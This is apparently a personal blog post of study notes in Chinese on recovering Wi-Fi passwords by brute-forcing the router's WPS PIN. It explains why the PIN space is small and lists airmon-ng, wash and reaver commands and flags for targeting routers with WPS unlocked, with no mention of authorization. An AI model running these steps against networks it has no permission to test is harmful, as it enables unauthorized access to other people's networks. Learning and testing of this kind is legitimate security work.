---
layout: post
title:  "PIN码破解Wi-Fi密码_学习笔记"
date:   2017-05-26 11:55:32 +0800
categories: hack your life
catalog:  true
tags:
  - hack your life
---



# 0 前言

发现自己对无线安全还是比较感兴趣的，上一篇学习了一下用aircrack-ng 来破解WPA，其基本原理是通过截获客户端和路由器之间的握手包，根据字典进行暴力破解，全程太依赖运气和字典，我认为过程不是太优雅。所以今天继续学习用PIN码进行破解。

毕竟最多也就猜个一万一千次，并且这种方法也不要求破解的时候已有客户端与路由器连接。


# 1 原理

规律

 * pin码是8位纯数字组成
 * 分三部分，前4位为第一部分，5-7位为第二部分，最后1位为第三部分。
 * 第一部分和第二部分没有关联。
 * 最后一位是根据第二部分计算得出的校验码

过程

1. 先单独对第一部分进行pin码匹配，
2. 前四位确定后再对第二部分进行匹配， 
3. 前7位，确定后，最后一位自动得出

算算

 1. 第一部分，前4位，根据排列组合，很容易算出 10<sup>4</sup>
 2. 第二部分，5到7位，10<sup>3</sup>
 3. 第三部分，直接得到结果


# 2 过程

## 1 检查插入的无线网卡


~~~
airmon-ng
~~~

~~~
iwconfig
~~~


## 2 开启监听模式

~~~
airmon-ng start wlan0
~~~

下面的命令暂时先记下，没有试过
~~~
ifconfig wlan0mon down
iwconfig wlan0mon mode monitor
ifconfig wlan0mon up
~~~


## 2 检查周围网络

~~~
wash -i wlan0
~~~

专挑WPS Locked 为 No 的下手。

## 3 reaver


~~~
reaver -i wlan0 -b 11:22:33:44:55:66 -S -N -vv -c 4
~~~

我在这一步没有成功，没有啥反馈，搜了一下，买了个新设备试试。

~~~
会出现很多，但一直都是12345670

一直提示
waiting for beacon from
~~~

* -i 监听借口名称
* -b 目标MAC地址
* -vv 显示更多的非严重警告
* -d delay每穷举一次的闲置时间，默认一秒。信号非常好，-d 0 ,信号普通-d 2,信号一般-d 5
* -t 即timeout 没次穷举等待返回的最长时间
* -c 指定频道

下面几个配置都没亲自试过

* -S 使用最小的DH key
* -p 一般钱四位默认是从0开始，如果通过这个参数设置从制定数值开始，例如9000.
* -s 穷举过程中，reaver会生成以路由MAC地址位名的wpc文件，在/etc/reaver/下。当时pin死了路由器，过段时间可以根据 -s file.wpc，就会根据之前的进度继续pin




# 4 注意点

1. 最后pin完最后会显示WPS PIN和WPA PSK。后期如果WPS功能没关，pin码没修改，无论怎样修改密码，都可以通过pin码获取wifi密码: reaver -i mon0 -b mac -p pin码，来再次得到密码。😄
2. 现在的路由一般会有防pin措施，例如会有300秒pin限制，但这个是伪防pin,作用不是很大。根据它设置时间间隔，正好防止我们把路由器pin死。




# 5 参考<a name="reference"></a>


   1. [无线安全专题_破解篇02--kali破解pin码](http://www.cnblogs.com/qiyeboy/p/5825525.html)
   2. [WPS Cracking with Reaver](https://www.pwnieexpress.com/blog/wps-cracking-with-reaver)